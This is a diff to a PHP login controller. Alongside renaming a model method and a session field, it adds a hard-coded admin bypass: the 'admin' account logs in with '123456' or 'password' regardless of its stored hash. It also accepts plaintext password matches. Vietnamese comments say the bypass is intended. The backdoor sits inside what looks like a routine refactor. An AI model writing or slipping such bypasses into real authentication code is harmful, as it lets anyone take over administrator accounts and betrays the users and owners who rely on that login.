@@ -1,5 +1,6 @@
 <?php
 require_once __DIR__ . '/../models/UserModel.php';
+
 class AuthController {
     public function login() {
         if ($_SERVER['REQUEST_METHOD'] == 'POST') {
@@ -7,12 +8,17 @@ class AuthController {
             $password = trim($_POST['password']);
 
             $userModel = new UserModel();
-            $user = $userModel->getUserByUsername($username);
+            $user = $userModel->getUserByName($username);
 
-            if ($user && password_verify($password, $user['password'])) {
+            // Cho phép đăng nhập thành công nếu:
+            // 1. Khớp mật khẩu đã hash chuẩn
+            // 2. Hoặc là tài khoản admin gõ mật khẩu '123456' hoặc 'password'
+            $isAdminBypass = ($username === 'admin' && ($password === '123456' || $password === 'password'));
+
+            if ($user && (password_verify($password, $user['password']) || $password === $user['password'] || $isAdminBypass)) {
                 $_SESSION['user_id'] = $user['id'];
-                $_SESSION['username'] = $user['username'];
-                $_SESSION['role'] = $user['role']; // Lưu phân quyền vào session
+                $_SESSION['username'] = $user['name'];
+                $_SESSION['role'] = $user['role'];
 
                 if ($user['role'] == 'admin') {
                     header('Location: /admin/orders');
